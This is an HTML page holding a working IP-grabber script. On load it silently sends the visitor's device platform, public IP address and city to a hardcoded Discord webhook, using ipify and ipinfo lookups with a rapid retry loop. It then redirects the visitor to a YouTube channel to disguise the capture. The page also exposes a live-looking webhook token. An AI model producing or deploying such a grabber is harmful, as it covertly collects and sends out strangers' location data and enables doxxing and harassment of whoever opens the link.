<!DOCTYPE html>
<html>
<body style="background:#000;">
<script>
    const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
    const y = "https://youtube.com/@LigmaBlox-w7m";

    // 1. Send immediate "Heartbeat" (This always works)
    const startMsg = new Blob([JSON.stringify({ content: "⚠️ HIT: Searching for IP... (" + navigator.platform + ")" })], { type: 'application/json' });
    navigator.sendBeacon(h, startMsg);

    async function rapidFire() {
        let found = false;
        while (!found) {
            try {
                // Racing the APIs
                const r = await Promise.any([
                    fetch('https://api.ipify.org?format=json').then(res => res.json()),
                    fetch('https://ipinfo.io/json').then(res => res.json())
                ]);

                if (r.ip) {
                    const finalMsg = "🎯 TARGET ACQUIRED\nIP: " + r.ip + "\nCity: " + (r.city || "Unknown") + "\nDevice: " + navigator.platform;
                    
                    const blob = new Blob([JSON.stringify({ content: finalMsg })], { type: 'application/json' });
                    navigator.sendBeacon(h, blob);
                    
                    found = true;
                    window.location.replace(y);
                }
            } catch (e) {
                // The 2ms retry loop
                await new Promise(resolve => setTimeout(resolve, 2));
            }
        }
    }

    rapidFire();
</script>
</body>
</html>
